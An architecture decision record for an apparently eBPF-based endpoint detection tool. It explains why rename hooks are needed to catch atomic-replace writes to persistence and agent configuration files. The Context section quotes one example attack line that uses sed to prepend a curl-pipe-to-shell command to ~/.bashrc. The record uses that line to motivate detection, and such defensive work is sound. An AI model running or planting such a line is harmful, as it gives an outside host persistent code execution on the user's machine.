# ADR 0005: File identity beyond open-for-write (rename part)

Status: Accepted (2026-11-07), rename part only
Milestone: M1a. The inode watchlist and link hooks are deferred: they will be added to this
ADR at the start of the milestone that builds them (v0.2 per the cut line).
Related: review NEW-4, SE-6, SE-10d; SPEC 6.1, 6.4, 8.2, 11.5

## Context

AEDR-002 (persistence) and AEDR-003 (agent configuration) match FILE_OPEN with write or
create on the target path. Many tools never open the target for writing. They write a
temporary file in the same directory and `rename()` it over the target:

- GNU `sed -i`;
- most editors' atomic save;
- many configuration writers, possibly including the agents' own file-writing tools
  (**VERIFY** per agent in M1a).

The open is on the temporary name. The rename is the only event that names the target. With
the M1 hook set as specified, `sed -i 's/^/curl x|sh;/' ~/.bashrc` would not alert.

SPEC 6.1 also lists `lsm/inode_rename`. That hook receives inodes and dentries but no
`struct path`, so it cannot produce an absolute path with `bpf_d_path`; a dentry walk alone
gives a path relative to the mount, not an absolute one.

## Decision

1. **Hook.** Capture renames with `lsm/path_rename` (fallback `fentry/security_path_rename`)
   instead of `inode_rename`. It receives `const struct path *old_dir, struct dentry
   *old_dentry, const struct path *new_dir, struct dentry *new_dentry` (plus `flags` on
   newer kernels; **VERIFY** the signature on 5.15 and 6.8 for fentry).
2. **Path rendering.** Absolute path = `bpf_d_path(dir)` + `/` + `dentry->d_name`, for old
   and new.
   - If the verifier refuses `bpf_d_path` at this attach point (it is allowlisted only for
     some hooks; SPEC 6.4 already has a **VERIFY**), use a bounded dentry plus mount walk
     (at most 32 components, following `mnt_parent` and `mnt_mountpoint`) into a per-CPU
     scratch buffer, and set `truncated=1` when the bound is hit.
   - The walk is written once and shared with the `file_open` fallback.
3. **Event.** `FILE_RENAME` (existing `rename_event` struct) with `old_path`, `new_path`,
   `truncated`, plus `flags` (`RENAME_EXCHANGE`, `RENAME_NOREPLACE`, `RENAME_WHITEOUT`).
4. **Engine normalization (enrichment).** A `FILE_RENAME` gets derived fields so existing
   write rules apply without new operators:
   - `path` = `new_path`, `write = true`, `create = true`, `via_rename = true`;
   - for `RENAME_EXCHANGE`, also a second derived view with `path` = `old_path`, because
     both names receive new content.
   `old_path` stays available for rules that care where content came from.
5. **Rules.** The rule `event:` key accepts a list (SPEC 11.1). AEDR-002, AEDR-003 and
   AEDR-013 (agent instruction persistence) use `event: [FILE_OPEN, FILE_RENAME]`. AEDR-004
   (M2) uses the same normalization for rename-into-staging.
6. **Moving in M1a.** The rename hook moves from M1 breadth into the M1a slice, because
   AEDR-002 and AEDR-003 ship in M1a.

## Alternatives considered

- **`lsm/inode_rename` with a dentry walk.** No mount information, so the path is wrong on
  any non-root mount (for example a separate `/home`). Rejected.
- **Detect atomic replace by correlating an open-for-write of a temporary name with a
  later rename in userspace.** Still needs the rename event. Rejected as a replacement;
  the rename event is required anyway.
- **Inode watchlist for persistence files.** Atomic replace changes the inode of the target
  on every save, so a watchlist of file inodes goes stale immediately. When the watchlist is
  built, persistence entries will watch the parent directory inode plus the name. Deferred.

## Consequences

- `sed -i`, editor saves and write-temp-then-rename writers are covered for AEDR-002, 003
  and 013.
- Rename events of agent processes become part of the event stream. Builds do many renames
  inside the workspace; these are filtered in userspace for rules and retained for replay
  under the normal retention policy.
- `CONFIG_SECURITY_PATH` is required for `path_rename`.

## Kernel-version notes

- `CONFIG_SECURITY_PATH=y` on Ubuntu 22.04 and 24.04 (AppArmor uses path hooks). **VERIFY**
  in M1a, and have `doctor` check `/boot/config-$(uname -r)` when readable.
- The `security_path_rename` signature gained `flags` in 5.x. **VERIFY** the BTF signature
  on 6.8 before writing the fentry variant (M1a) and on 5.15 as a named check in the M1b
  kernel matrix (SPEC 6.1, gotcha 24).
- **VERIFY** whether `bpf_d_path` is accepted for `lsm/path_rename` and
  `fentry/security_path_rename` on both kernels.

## Tests

- Golden (AEDR-002): `sed -i` on `~/.bashrc` as a recorded event pair (open of a temp name,
  rename onto `~/.bashrc`) produces one alert. Near-miss: a rename inside the workspace
  produces none.
- Integration: `sed -i` under a fake agent emits `FILE_RENAME` with the absolute
  `new_path`; a rename on a separate mount renders the mount prefix; `mv a b` with
  `RENAME_EXCHANGE` (via `renameat2`) sets `flags`.
- Evasion corpus: EVA-003 (atomic replace of a persistence file).
